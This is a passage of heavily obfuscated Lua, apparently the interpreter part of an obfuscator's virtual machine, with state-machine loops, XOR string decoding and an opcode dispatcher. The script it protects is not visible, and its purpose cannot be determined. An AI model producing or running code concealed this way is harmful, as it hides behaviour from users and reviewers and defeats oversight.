end end else if 4==de then return db else break end end end de=de+1 end end,function(by,bz,cc,ce)local cs=0 while true do if cs<=2 then if cs<=0 then if cx>bw then local bw=cw while true do bw=(bw+cu)if not(not(bw==ct))then break else return by end end end else if 2~=cs then cx=(cx+cu)else cy=(((cy-bk)%bs))end end else if cs<=3 then if(not(((cy%bi))~=bj)or(cy%bi)>bj)then local bi=cw while true do bi=bi+cu if(not(bi~=ct)or(bi>ct))then if(bi<bh)then return cc else break end else cy=((cy*bg))%be end end else local be=cw while true do be=((be+cu))if((be<ct))then return by(bz((ce and bz),by and bz,((cc and by)),by),(ce(bz,ce,bz,(cc and ce))and cc(cc,ce,cc,cc)),(cc(ce,by and ce,by,ce)and bz(by,by and by,cc,bz)),cc(cc,ce,(bz and ce),cc))else break end end end else if cs<5 then return by(cc(cc,bz,(cc and by),ce),ce(cc,cc,ce,by),by(ce,ce,bz,by),bz(by,(by and by),cc,ce))else break end end end cs=cs+1 end end,function(be,bg,bi,bj)local bk=0 while true do if bk<=2 then if bk<=0 then if((cx>bf))then local bf=cw while true do bf=(bf+cu)if bf<ct then return bj else break end end end else if 2~=bk then cx=(cx+cu)else cy=((cy+y)%x)end end else if bk<=3 then if(((((cy%v))>w)or not((cy%v)~=w)))then local v=cw while true do v=((v+cu))if((v<cu or v==cu))then cy=(((cy-ca))%s)else if not(not(v==bh))then break else return bj end end end else local s=cw while true do s=(s+cu)if not((s~=ct))then break else return bi(be(bi,((be and bi)),bg,bj),((bj(bi,be,bg,bi)and bg(bj,(bj and bi),bg,(bi and bj)))),bi(bg,bi,be,bi),bg(bg,bj,bg,bg))end end end else if 5>bk then return be(bi(bg and bj,bg,(bg and be),(bj and bi)),bj(be,bi,bj,bi),bj((bj and bi),(bi and bi),bg,bi),be(bi,bj,bg,bj))else break end end end bk=bk+1 end end,function(s,v,w,x)local y=0 while true do if y<=2 then if y<=0 then if(cx>q)then local q=cw while true do q=(q+cu)if(q<ct)then return x else break end end end else if y==1 then cx=(cx+cu)else cy=((cy*p)%d)end end else if y<=3 then if((((cy%c))>b))then local b=cw while true do b=b+cu if((b<ct))then return s(w(x,s,s,((v and w))),(s(s,w,v,((v and s)))and x(v,x,x,v)),v(s,x,s,(w and s)),(w(s,w,s,w)and s(v,w,s,(s and x))))else break end end else local b=cw while true do b=b+cu if not(b~=ct)then break else return v end end end else if y<5 then return x else break end end end y=y+1 end end)else if 31==a then return cy;else break end end end end end end a=a+1 end end)()));else ck=function()local a,b,c,d,p,q,s=0 while true do if a<=3 then if a<=1 then if 0<a then if(b==0 and(c==0))then return 0;end;else b,c=cf(),cf()end else if 2<a then p=(((cd(c,1,20)*(2^32)))+b)else d=1 end end else if a<=5 then if 5>a then q=cd(c,21,31)else s=(((-1)^cd(c,32)))end else if a<=6 then if(q==0)then if((p==0))then return(s*0);else q=1;d=0;end;elseif((q==2047))then if(not(p~=0))then return(s*(1/0));else return(s*((0/0)));end;end;else if a>7 then break else return(s*2^(q-1023)*(d+(p/(2^52))))end end end end a=a+1 end end end else if bd<=29 then cl="\46"else if bd~=31 then cm=function()local a,b,c=0 while true do if a<=1 then if 1>a then b,c=h(bn,br,br+2)else b,c=bu(b,cb),bu(c,cb);end else if a<=2 then br=(br+2);else if a==3 then return((bv(c,8))+b);else break end end end a=a+1 end end else cn=cf end end end else if bd<=33 then if bd>32 then cp=cf else co=function()local a,b,c,d,p=0 while true do if a<=2 then if a<=0 then b=g else if a~=2 then c=157 else d=0 end end else if a<=3 then p={}else if 5~=a then while d<8 do d=d+1;while(d<707 and c%1622<811)do c=(((c*35)))local q=(d+c)if(((c%16522))<8261)then c=(c*19)while((d<828)and c%658<329)do c=((c+60))local q=(d+c)if(((c%18428))==9214 or((c%18428))<9214)then c=(((c-50)))local q=10701 if not p[q]then p[q]=1;local q,s=cn(),g;if not(q~=0)then return g;end;b=j(bn,br,((br+q)-1));br=(br+q);return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s>1 then break else while true do if(0<v)then break else return i(h(q))end v=(v+1)end end end s=s+1 end end);end elseif(not(c%4==0))then c=(c-67)local q=33140 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 2>s then while true do if v~=1 then return i(h(q))else break end v=v+1 end else break end end s=s+1 end end);end else c=(c*88)d=(d+1)local q=92657 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 1==s then while true do if 1>v then return i(h(q))else break end v=v+1 end else break end end s=s+1 end end);end end;d=(d+1);end elseif not(c%4==0)then c=(c-48)while(((d<859)and c%1392<696))do c=(c*39)local q=(d+c)if(((c%58))<29)then c=(((c+5)))local q=33930 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 2>s then while true do if v>0 then break else return i(h(q))end v=v+1 end else break end end s=s+1 end end);end elseif not(c%4==0)then c=((c*56))local q=35370 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 2>s then while true do if v>0 then break else return i(h(q))end v=v+1 end else break end end s=s+1 end end);end else c=((c*9))d=d+1 local q=96267 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s<2 then while true do if(1~=v)then return i(h(q))else break end v=(v+1)end else break end end s=s+1 end end);end end;d=(d+1);end else c=(((c-51)))d=(d+1)while(d<663)and((c%936)<468)do c=(((c*12)))local q=((d+c))if(((c%18532)==9266 or(c%18532)>9266))then c=(c*71)local q=7037 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s==1 then while true do if v>0 then break else return i(h(q))end v=(v+1)end else break end end s=s+1 end end);end elseif not((c%4==0))then c=(c-18)local q=90882 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 1<s then break else while true do if 1~=v then return i(h(q))else break end v=v+1 end end end s=s+1 end end);end else c=((c*35))d=((d+1))local q=41573 if not p[q]then p[q]=1;return z(b,cl,function(b)local p,q=0 while true do if p<=0 then q=0 else if p<2 then while true do if not(q~=0)then return i(h(b))else break end q=(q+1)end else break end end p=p+1 end end);end end;d=(d+1);end end;d=(d+1);end c=((c-494))if(d>43)then break;end;end;else break end end end a=a+1 end end end else if bd<=34 then cq=function(...)local a=0 while true do if 0<a then break else return{...},n("\35",...)end a=a+1 end end else if bd~=36 then cr=function()local a,b,c,d,p,q,s,v,w,x=0 while true do if a<=9 then if a<=4 then if a<=1 then if a==0 then b,c,d,p={},{},{},{}else q=m({[ch]=b,nil,[ci]=c,nil,[776]=p,[345]=bb,[536]=nil},{['\95\95\116\111\115\116\114\105\110\103']=function(...)return j(bn,br,br);end,})end else if a<=2 then s={}else if a==3 then v=490 else w=0 end end end else if a<=6 then if 5==a then x={}else while(w<3)do w=((w+1));while((w<481 and v%320<160))do v=((v*62))local d=(w+v)if(v%916)>458 then v=((v-88))while(((w<318))and(v%702<351))do v=(((v*8)))local d=(w+v)if((v%14064)>7032)then v=((v*81))local d=58084 if not x[d]then x[d]=1;s[cf()]=nil;end elseif not((v%4)==0)then v=(v*37)local d=93269 if not x[d]then x[d]=1;s[cf()]=nil;end else v=(v+10)w=((w+1))local d=78058 if not x[d]then x[d]=1;for d=1,cf()do local j=cg();if(not(not(j==1)))then s[d]=nil;elseif(not(not(j==2)))then s[d]=(not(not(cg()~=0)));elseif(((j==0)))then s[d]=ck();elseif(not(j~=3))then s[d]=co();end;end;q[cj]=s;end end;w=(w+1);end elseif not(not(((v%4))~=0))then v=((v*65))while w<615 and v%618<309 do v=(v-33)local d=(w+v)if((v%15582)>7791)then v=((v*14))local d=31092 if not x[d]then x[d]=1;s[cf()]=nil;end elseif not((v%4==0))then v=((v+51))local d=68285 if not x[d]then x[d]=1;s[cf()]=nil;end else v=((v+53))w=(w+1)local d=64266 if not x[d]then x[d]=1;s[cf()]=nil;end end;w=(w+1);end else v=((v+7))w=w+1 while((w<127)and(v%1548<774))do v=((v-37))local d=(w+v)if(((v%19188)>9594))then v=(((v*61)))local d=73351 if not x[d]then x[d]=1;s[cf()]=nil;end elseif not(not(v%4~=0))then v=((v+25))local d=78934 if not x[d]then x[d]=1;s[cf()]=nil;end else v=((v+42))w=((w+1))local d=62692 if not x[d]then x[d]=1;s[cf()]=nil;end end;w=(w+1);end end;w=(w+1);end v=((v*482))if w>56 then break;end;end;end else if a<=7 then q[481]=cg();else if 9~=a then v=773 else w=0 end end end end else if a<=14 then if a<=11 then if 10==a then x={}else while((w<7))do w=(w+1);while((w<601 and v%1932<966))do v=((v*51))local d=(w+v)if(((v%1332)<=666))then v=((v-24))while((w<80 and v%490<245))do v=(((v*96)))local d=((w+v))if(v%10832)>5416 then v=(((v+68)))local d=48563 if not x[d]then x[d]=1;end elseif not((v%4)==0)then v=((v*34))local d=65890 if not x[d]then x[d]=1;end else v=(v-86)w=((w+1))local d=68281 if not x[d]then x[d]=1;end end;w=w+1;end elseif not(not((v%4)~=0))then v=(((v-3)))while w<82 and v%560<280 do v=((v*54))local d=w+v if(((v%19918)>9959))then v=(((v+79)))local d=9632 if not x[d]then x[d]=1;local d=1;local j=2;local p=3;local y=4;for y=1,cf()do local bb=cg();local be=cd(bb,d,d);if(not(not(be==0)))then local bb,be,bf=cd(bb,j,p),cd(bb,4,6),m({[77]=cm(),[266]=cm(),nil,nil},{['\95\95\116\111\115\116\114\105\110\103']=function(...)return cd(bb,j,p);end,})if((((not(bb~=0))or((bb==d)))))then bf[607]=cf();if(not(((bb~=0))))then bf[185]=cf();end;elseif(not(bb~=j))or((bb==p))then bf[607]=((cf()-(e)));if(not(not(not(bb~=p))))then bf[185]=cm();end;end;if(((cd(be,d,d)==d)))then bf[266]=s[bf[266]];end;if(not(not((cd(be,j,j)==d))))then bf[607]=s[bf[607]];end;if(not(not(cd(be,p,p)==d)))then bf[185]=s[bf[185]];end;b[y]=bf;end;end;end elseif((v%4~=0))then v=((v-31))local b=27017 if not x[b]then x[b]=1;end else v=(v*83)w=(w+1)local b=6559 if not x[b]then x[b]=1;end end;w=(w+1);end else v=((v+27))w=(w+1)while((w<425)and(v%310<155))do v=(((v*46)))local b=w+v if((((v%12296))==6148)or((v%12296))<6148)then v=((v*78))local b=29918 if not x[b]then x[b]=1;end elseif not(not(((v%4))~=0))then v=(v*30)local b=86781 if not x[b]then x[b]=1;end else v=((v-26))w=(w+1)local b=38757 if not x[b]then x[b]=1;end end;w=(w+1);end end;w=(w+1);end v=((v+570))if((w>50))then break;end;end;end else if a<=12 then for b=1,cf()do c[(b-1)]=cr();end;else if 14~=a then do for b=1,#q[ch]do local b=q[ch][b]local c,d,e=b[266],b[607],b[185]if not(not(bp(c)==f))then c=z(c,cl,function(j,p)local p,s=0 while true do if p<=0 then s=0 else if 1==p then while true do if(s>0)then break else return i(bu(h(j),cb))end s=s+1 end else break end end p=p+1 end end)b[266]=c end if not(bp(d)~=f)then d=z(d,cl,function(c,j,j)local j,p=0 while true do if j<=0 then p=0 else if j>1 then break else while true do if(p~=1)then return i(bu(h(c),cb))else break end p=p+1 end end end j=j+1 end end)b[607]=d end if not((not(bp(e)==f)))then e=z(e,cl,function(c,d,d,d)local d,j=0 while true do if d<=0 then j=0 else if d>1 then break else while true do if(0<j)then break else return i(bu(h(c),cb))end j=j+1 end end end d=d+1 end end)b[185]=e end;end;q[cj]=nil;end;else v=300 end end end else if a<=16 then if a<16 then w=0 else x={}end else if a<=17 then while(w<4)do w=(w+1);while w<587 and v%730<365 do v=(((v-22)))local b=(w+v)if(((v%13572)<=6786))then v=(v*95)while(w<847 and v%148<74)do v=(((v-51)))local b=w+v if(((v%2916)>1458 or(v%2916)==1458))then v=((v+89))local b=21463 if not x[b]then x[b]=1;return q end elseif not((v%4)==0)then v=((v+1))local b=67674 if not x[b]then x[b]=1;q[536]=function(...)local b,c,d,e,h=0 while true do if b<=0 then c,d,e,h=0 else if 1<b then break else while true do if(c<=2)then if(c<=0)then d=n(1,...)else if not(1~=c)then e=({...})else do for d=0,#e do if not(not(bp(e[d])==bq))then for i,i in o,e[d]do if bp(i)==bp(g)then t(bo,i)end end else t(bo,e[d])end end end end end else if(c<=3)then h=function(d)local i,j,p=0 while true do if i<=0 then j,p=0 else if i<2 then while true do if(j<=1)then if 1>j then p=u(d)else for p=0,#bo do if ba(d,bo[p])then return bm(f);end end end else if not(j==3)then return false else break end end j=j+1 end else break end end i=i+1 end end else if c>4 then break else for d=0,#e do if not(not(bp(e[d])==bq))then return h(e[d])end end end end end c=c+1 end end end b=b+1 end end end else v=(((v-98)))w=(w+1)local b=86239 if not x[b]then x[b]=1;return q end end;w=(w+1);end elseif not((v%4)==0)then v=((v+39))while(w<171)and(v%1192<596)do v=(((v-30)))local b=(w+v)if(v%8702)<4351 then v=(((v*12)))local b=73035 if not x[b]then x[b]=1;return q end elseif(v%4~=0)then v=(((v*22)))local b=76542 if not x[b]then x[b]=1;return q end else v=(((v*98)))w=(w+1)local b=92088 if not x[b]then x[b]=1;return q end end;w=w+1;end else v=(v-35)w=w+1 while((w<984)and(v%1490<745))do v=((v+25))local b=((w+v))if((((v%14264)))<7132 or((v%14264))==7132)then v=((v-72))local b=77825 if not x[b]then x[b]=1;return q end elseif not(((v%4)==0))then v=(v+73)local b=2430 if not x[b]then x[b]=1;return q end else v=((v-9))w=w+1 local b=96086 if not x[b]then x[b]=1;return q end end;w=(w+1);end end;w=((w+1));end v=((v+219))if((w>96))then break;end;end;else if a==18 then return q;else break end end end end end a=a+1 end end else break end end end end end end bd=bd+1 end local function a(b,c)local d if bp(l)==bq then d=l;else d=l(bl);end local e={}for f,h in o,d do if h~=b then e[f]=h else e[f]=c;end end if bc then return bc(bl,e)else l=e;return l;end end;local function b(...)local c=n(bl,...);local d=c[ci];local e=c[536];local f=c[ch];local h=n(2,...);local i=c[345];local j=n(3,...);local o=c[481];local c=c[776];local c=bt[ba(bx,i)];return function(...)local i,n,p,q,s,u,v,w=cq,1,-1,{},{...},(n("\35",...)-1),{},{};for x=0,u,1 do if(x>=o)then q[x-o]=s[x+1];else w[x]=s[x+1];end;end;local x,y,z,ba=(u-o+1),nil,nil,{};while true do y=f[n];z=y[77];if 186>=z then if 92>=z then if z<=45 then if z<=22 then if 10>=z then if(z<=4)then if(1>=z)then if(0<z)then local ba,bb,bc=0 while true do if ba<=24 then if ba<=11 then if ba<=5 then if ba<=2 then if ba<=0 then bb=nil else if ba<2 then bc=nil else w[y[266]]={};end end else if ba<=3 then n=n+1;else if ba>4 then w[y[266]]=h[y[607]];else y=f[n];end end end else if ba<=8 then if ba<=6 then n=n+1;else if ba~=8 then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end else if ba<=9 then n=n+1;else if 11>ba then y=f[n];else w[y[266]]=h[y[607]];end end end end else if ba<=17 then if ba<=14 then if ba<=12 then n=n+1;else if ba>13 then w[y[266]]=w[y[607]][y[185]];else y=f[n];end end else if ba<=15 then n=n+1;else if 16<ba then w[y[266]]=w[y[607]][y[185]];else y=f[n];end end end else if ba<=20 then if ba<=18 then n=n+1;else if 20~=ba then y=f[n];else w[y[266]]={};end end else if ba<=22 then if ba~=22 then n=n+1;else y=f[n];end else if ba>23 then n=n+1;else w[y[266]]={};end end end end end else if ba<=37 then if ba<=30 then if ba<=27 then if ba<=25 then y=f[n];else if ba~=27 then w[y[266]]=h[y[607]];else n=n+1;end end else if ba<=28 then y=f[n];else if ba>29 then n=n+1;else w[y[266]][y[607]]=w[y[185]];end end end else if ba<=33 then if ba<=31 then y=f[n];else if 32<ba then n=n+1;else w[y[266]]=h[y[607]];end end else if ba<=35 then if ba==34 then y=f[n];else w[y[266]][y[607]]=w[y[185]];end else if 36==ba then n=n+1;else y=f[n];end end end end else if ba<=43 then if ba<=40 then if ba<=38 then w[y[266]][y[607]]=w[y[185]];else if ba~=40 then n=n+1;else y=f[n];end end else if ba<=41 then w[y[266]]={r({},1,y[607])};else if ba~=43 then n=n+1;else y=f[n];end end end else if ba<=46 then if ba<=44 then w[y[266]]=w[y[607]];else if ba>45 then y=f[n];else n=n+1;end end else if ba<=48 then if 47==ba then bc=y[266];else bb=w[bc];end else if ba~=50 then for bd=bc+1,y[607]do t(bb,w[bd])end;else break end end end end end end ba=ba+1 end else local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba==0 then bb=nil else w[y[266]][y[607]]=w[y[185]];end else if 2<ba then y=f[n];else n=n+1;end end else if ba<=5 then if ba==4 then w[y[266]]={};else n=n+1;end else if 6<ba then w[y[266]][y[607]]=y[185];else y=f[n];end end end else if ba<=11 then if ba<=9 then if 9~=ba then n=n+1;else y=f[n];end else if ba~=11 then w[y[266]][y[607]]=w[y[185]];else n=n+1;end end else if ba<=13 then if 13~=ba then y=f[n];else bb=y[266]end else if 14<ba then break else w[bb]=w[bb](r(w,bb+1,y[607]))end end end end ba=ba+1 end end;elseif(z==2 or z<2)then local ba=y[266]w[ba](r(w,ba+1,p))elseif(3<z)then local ba=y[266]local bb,bc=i(w[ba](w[ba+1]))p=bc+ba-1 local bc=0;for bd=ba,p do bc=bc+1;w[bd]=bb[bc];end;else local ba,bb=0 while true do if ba<=10 then if ba<=4 then if ba<=1 then if 1>ba then bb=nil else w[y[266]]=j[y[607]];end else if ba<=2 then n=n+1;else if 3==ba then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end else if ba<=7 then if ba<=5 then n=n+1;else if 7~=ba then y=f[n];else w[y[266]]=y[607];end end else if ba<=8 then n=n+1;else if ba<10 then y=f[n];else w[y[266]]=y[607];end end end end else if ba<=15 then if ba<=12 then if 11==ba then n=n+1;else y=f[n];end else if ba<=13 then w[y[266]]=y[607];else if ba>14 then y=f[n];else n=n+1;end end end else if ba<=18 then if ba<=16 then w[y[266]]=y[607];else if ba==17 then n=n+1;else y=f[n];end end else if ba<=19 then bb=y[266]else if ba==20 then w[bb]=w[bb](r(w,bb+1,y[607]))else break end end end end end ba=ba+1 end end;elseif(z<=7)then if(5==z or 5>z)then local ba,bb,bc,bd=0 while true do if ba<=15 then if ba<=7 then if ba<=3 then if ba<=1 then if ba>0 then bc=nil else bb=nil end else if ba==2 then bd=nil else w[y[266]]=h[y[607]];end end else if ba<=5 then if ba==4 then n=n+1;else y=f[n];end else if 6==ba then w[y[266]]=w[y[607]][y[185]];else n=n+1;end end end else if ba<=11 then if ba<=9 then if ba<9 then y=f[n];else w[y[266]]=h[y[607]];end else if ba<11 then n=n+1;else y=f[n];end end else if ba<=13 then if ba~=13 then w[y[266]]=w[y[607]][y[185]];else n=n+1;end else if ba>14 then w[y[266]]=w[y[607]][w[y[185]]];else y=f[n];end end end end else if ba<=23 then if ba<=19 then if ba<=17 then if 16==ba then n=n+1;else y=f[n];end else if 19~=ba then w[y[266]]=h[y[607]];else n=n+1;end end else if ba<=21 then if ba~=21 then y=f[n];else w[y[266]]=w[y[607]][y[185]];end else if ba==22 then n=n+1;else y=f[n];end end end else if ba<=27 then if ba<=25 then if ba<25 then w[y[266]]=w[y[607]][y[185]];else n=n+1;end else if ba~=27 then y=f[n];else bd=y[607];end end else if ba<=29 then if 28<ba then bb=k(w,g,bd,bc);else bc=y[185];end else if ba>30 then break else w[y[266]]=bb;end end end end end ba=ba+1 end elseif(z==6)then local ba,bb,bc=0 while true do if ba<=12 then if ba<=5 then if ba<=2 then if ba<=0 then bb=nil else if 2~=ba then bc=nil else w[y[266]]=w[y[607]][y[185]];end end else if ba<=3 then n=n+1;else if 5>ba then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end else if ba<=8 then if ba<=6 then n=n+1;else if 8>ba then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end else if ba<=10 then if ba==9 then n=n+1;else y=f[n];end else if ba~=12 then w[y[266]]=w[y[607]][y[185]];else n=n+1;end end end end else if ba<=19 then if ba<=15 then if ba<=13 then y=f[n];else if 15~=ba then w[y[266]]=j[y[607]];else n=n+1;end end else if ba<=17 then if ba==16 then y=f[n];else w[y[266]]=w[y[607]][y[185]];end else if 18==ba then n=n+1;else y=f[n];end end end else if ba<=22 then if ba<=20 then w[y[266]]=w[y[607]][y[185]];else if ba>21 then y=f[n];else n=n+1;end end else if ba<=24 then if 24~=ba then bc=y[266];else bb=w[bc];end else if ba==25 then for bd=bc+1,y[607]do t(bb,w[bd])end;else break end end end end end ba=ba+1 end else local ba,bb=0 while true do if ba<=12 then if ba<=5 then if ba<=2 then if ba<=0 then bb=nil else if 1==ba then w={};else for bc=0,u,1 do if bc<o then w[bc]=s[bc+1];else break;end;end;end end else if ba<=3 then n=n+1;else if 4<ba then w[y[266]]=h[y[607]];else y=f[n];end end end else if ba<=8 then if ba<=6 then n=n+1;else if 8~=ba then y=f[n];else w[y[266]]=j[y[607]];end end else if ba<=10 then if 9<ba then y=f[n];else n=n+1;end else if 11==ba then w[y[266]]=w[y[607]][y[185]];else n=n+1;end end end end else if ba<=18 then if ba<=15 then if ba<=13 then y=f[n];else if ba<15 then w[y[266]]=y[607];else n=n+1;end end else if ba<=16 then y=f[n];else if 17==ba then w[y[266]]=y[607];else n=n+1;end end end else if ba<=21 then if ba<=19 then y=f[n];else if 20==ba then w[y[266]]=y[607];else n=n+1;end end else if ba<=23 then if 22==ba then y=f[n];else bb=y[266]end else if ba~=25 then w[bb]=w[bb](r(w,bb+1,y[607]))else break end end end end end ba=ba+1 end end;elseif(8>z or 8==z)then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if 1>ba then bb=nil else w[y[266]]=h[y[607]];end else if ba<3 then n=n+1;else y=f[n];end end else if ba<=5 then if ba<5 then w[y[266]]=w[y[607]][y[185]];else n=n+1;end else if ba~=7 then y=f[n];else w[y[266]]=y[607];end end end else if ba<=11 then if ba<=9 then if 8<ba then y=f[n];else n=n+1;end else if 11>ba then w[y[266]]=y[607];else n=n+1;end end else if ba<=13 then if ba~=13 then y=f[n];else bb=y[266]end else if ba<15 then w[bb]=w[bb](r(w,bb+1,y[607]))else break end end end end ba=ba+1 end elseif(z>9)then n=y[607];else local ba,bb=0 while true do if ba<=10 then if ba<=4 then if ba<=1 then if 1~=ba then bb=nil else w[y[266]]=j[y[607]];end else if ba<=2 then n=n+1;else if 3<ba then w[y[266]]=w[y[607]][y[185]];else y=f[n];end end end else if ba<=7 then if ba<=5 then n=n+1;else if 7>ba then y=f[n];else w[y[266]]=y[607];end end else if ba<=8 then n=n+1;else if ba>9 then w[y[266]]=y[607];else y=f[n];end end end end else if ba<=15 then if ba<=12 then if ba~=12 then n=n+1;else y=f[n];end else if ba<=13 then w[y[266]]=y[607];else if ba<15 then n=n+1;else y=f[n];end end end else if ba<=18 then if ba<=16 then w[y[266]]=y[607];else if ba<18 then n=n+1;else y=f[n];end end else if ba<=19 then bb=y[266]else if ba<21 then w[bb]=w[bb](r(w,bb+1,y[607]))else break end end end end end ba=ba+1 end end;elseif 16>=z then if(z<=13)then if(11>z or 11==z)then local ba,bb=0 while true do if ba<=16 then if ba<=7 then if ba<=3 then if ba<=1 then if 1~=ba then bb=nil else w[y[266]]=w[y[607]][y[185]];end else if 3~=ba then n=n+1;else y=f[n];end end else if ba<=5 then if 4==ba then w[y[266]]=h[y[607]];else n=n+1;end else if 6==ba then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end else if ba<=11 then if ba<=9 then if 9>ba then n=n+1;else y=f[n];end else if ba>10 then n=n+1;else w[y[266]]={};end end else if ba<=13 then if 12<ba then w[y[266]]=h[y[607]];else y=f[n];end else if ba<=14 then n=n+1;else if ba~=16 then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end end end else if ba<=24 then if ba<=20 then if ba<=18 then if ba<18 then n=n+1;else y=f[n];end else if 20>ba then w[y[266]]=h[y[607]];else n=n+1;end end else if ba<=22 then if 22>ba then y=f[n];else w[y[266]]={};end else if 23<ba then y=f[n];else n=n+1;end end end else if ba<=28 then if ba<=26 then if 25==ba then w[y[266]]=h[y[607]];else n=n+1;end else if 28~=ba then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end else if ba<=30 then if ba==29 then n=n+1;else y=f[n];end else if ba<=31 then bb=y[266]else if ba<33 then w[bb]=w[bb]()else break end end end end end end ba=ba+1 end elseif 12<z then w[y[266]]={r({},1,y[607])};else local ba=y[266];local bb=w[ba];for bc=(ba+1),p do t(bb,w[bc])end;end;elseif(14==z or 14>z)then w[y[266]]=true;elseif(z==15)then local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if ba~=1 then bb=nil else w[y[266]]=w[y[607]][y[185]];end else if ba>2 then y=f[n];else n=n+1;end end else if ba<=5 then if 4<ba then n=n+1;else w[y[266]]=w[y[607]][y[185]];end else if ba<=6 then y=f[n];else if ba>7 then n=n+1;else w[y[266]]=w[y[607]][y[185]];end end end end else if ba<=13 then if ba<=10 then if 9==ba then y=f[n];else w[y[266]]=w[y[607]][y[185]];end else if ba<=11 then n=n+1;else if 12==ba then y=f[n];else w[y[266]]=false;end end end else if ba<=15 then if ba<15 then n=n+1;else y=f[n];end else if ba<=16 then bb=y[266]else if 17==ba then w[bb](w[bb+1])else break end end end end end ba=ba+1 end else local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba<1 then bb=nil else bc=nil end else if ba<=2 then bd=nil else if 3<ba then n=n+1;else w[y[266]]=h[y[607]];end end end else if ba<=6 then if 6>ba then y=f[n];else w[y[266]]=h[y[607]];end else if ba<=7 then n=n+1;else if ba==8 then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end end else if ba<=14 then if ba<=11 then if ba<11 then n=n+1;else y=f[n];end else if ba<=12 then w[y[266]]=w[y[607]][w[y[185]]];else if ba~=14 then n=n+1;else y=f[n];end end end else if ba<=16 then if 16>ba then bd=y[266]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if ba==18 then for be=bd,y[185]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end end;elseif z<=19 then if 17>=z then j[y[607]]=w[y[266]];elseif 19~=z then local ba=y[266];local bb=y[185];local bc=ba+2;local bd={w[ba](w[ba+1],w[bc])};for be=1,bb do w[bc+be]=bd[be];end local ba=w[ba+3];if ba then w[bc]=ba;n=y[607];else n=n+1 end;else local ba=y[266];local bb=w[y[607]];w[ba+1]=bb;w[ba]=bb[w[y[185]]];end;elseif z<=20 then if(w[y[266]]<=w[y[185]])then n=n+1;else n=y[607];end;elseif z==21 then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];if(w[y[266]]~=y[185])then n=n+1;else n=y[607];end;else if(w[y[266]]<=w[y[185]])then n=y[607];else n=n+1;end;end;elseif 33>=z then if z<=27 then if(z<24 or z==24)then if(24~=z)then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 0<ba then bc=nil else bb=nil end else if ba<=2 then bd=nil else if ba~=4 then w[y[266]]=h[y[607]];else n=n+1;end end end else if ba<=6 then if 5==ba then y=f[n];else w[y[266]]=h[y[607]];end else if ba<=7 then n=n+1;else if ba<9 then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end end else if ba<=14 then if ba<=11 then if 11>ba then n=n+1;else y=f[n];end else if ba<=12 then w[y[266]]=w[y[607]][w[y[185]]];else if 14>ba then n=n+1;else y=f[n];end end end else if ba<=16 then if ba>15 then bc={w[bd](w[bd+1])};else bd=y[266]end else if ba<=17 then bb=0;else if ba==18 then for be=bd,y[185]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end else local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if ba<1 then bb=nil else w[y[266]]=w[y[607]][y[185]];end else if 3>ba then n=n+1;else y=f[n];end end else if ba<=5 then if ba>4 then n=n+1;else w[y[266]]=w[y[607]][y[185]];end else if ba<=6 then y=f[n];else if ba>7 then n=n+1;else w[y[266]]=w[y[607]][y[185]];end end end end else if ba<=13 then if ba<=10 then if 10~=ba then y=f[n];else w[y[266]]=w[y[607]][y[185]];end else if ba<=11 then n=n+1;else if ba==12 then y=f[n];else w[y[266]]=false;end end end else if ba<=15 then if 15~=ba then n=n+1;else y=f[n];end else if ba<=16 then bb=y[266]else if ba>17 then break else w[bb](w[bb+1])end end end end end ba=ba+1 end end;elseif(25==z or 25>z)then local ba,bb=0 while true do if(ba<=10)then if(ba<4 or ba==4)then if(ba==1 or ba<1)then if ba<1 then bb=nil else w[y[266]]=w[y[607]][y[185]];end else if ba<=2 then n=(n+1);else if(ba<4)then y=f[n];else w[y[266]]=h[y[607]];end end end else if(ba<7 or ba==7)then if(ba<=5)then n=(n+1);else if(7>ba)then y=f[n];else w[y[266]]=h[y[607]];end end else if(ba==8 or ba<8)then n=(n+1);else if not(10==ba)then y=f[n];else w[y[266]]=h[y[607]];end end end end else if(ba<15 or ba==15)then if(ba<12 or ba==12)then if(11<ba)then y=f[n];else n=n+1;end else if(ba<13 or ba==13)then w[y[266]]=h[y[607]];else if(15>ba)then n=(n+1);else y=f[n];end end end else if ba<=18 then if(ba<=16)then w[y[266]]=w[y[607]];else if not(17~=ba)then n=n+1;else y=f[n];end end else if(ba<=19)then bb=y[266]else if 20<ba then break else w[bb](r(w,(bb+1),y[607]))end end end end end ba=ba+1 end elseif(26==z)then local ba=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if 1~=ba then 